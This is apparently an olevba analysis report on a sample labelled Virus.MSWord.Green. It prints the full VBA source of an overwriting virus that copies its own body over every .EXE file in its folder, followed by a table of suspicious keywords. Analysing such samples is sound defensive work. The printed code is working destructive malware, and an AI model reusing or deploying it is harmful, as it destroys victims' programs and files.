olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Green
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Green - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Green - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
 Dim erej() As Byte
 Dim zrtva As String
 Const velicina As Integer = 24576
 Private Sub Form_Load()
 On Error Resume Next
 trazi
 End Sub
 Sub trazi()
 Dim Free
 Free = FreeFile
 Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
 ReDim erej(velicina)
 Get #1, 1, erej
 Close #Free
 zrtva = Dir(App.Path & "\" & "*.EXE")
 While zrtva <> ""
 Open App.Path & "\" & zrtva For Binary Access Write As #Free
 Put #1, , erej
 Put #1, , velicina
 Close #Free
 zrtva = Dir()
 Wend
 'HLLO.GreenDay by e[ax]
 'Greetz to all ppl on #virus
 'Pozdravljam cijeli BiHNet.ORG
 'Pain: 10x for help
 End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
+----------+--------------------+---------------------------------------------+

